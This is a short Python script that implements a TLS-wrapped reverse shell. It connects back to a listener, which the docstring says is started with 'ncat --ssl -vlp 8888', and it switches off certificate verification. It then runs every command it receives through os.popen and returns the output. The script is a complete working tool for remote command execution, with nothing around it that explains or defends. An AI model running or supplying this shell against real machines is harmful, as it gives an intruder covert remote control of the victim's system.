#!/usr/bin/python

'''
The counterpart is done by: ncat --ssl -vlp 8888
'''

import os
import socket
import ssl # for socket wrapper

	# values
host = "localhost"
port = 8888
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
wsock = context.wrap_socket(s, server_hostname=host)
wsock.connect((host,port))

while True:
	command = wsock.recv(1000)
	# receiving command
	result = os.popen(command).read()
	# sending command
	wsock.send(result)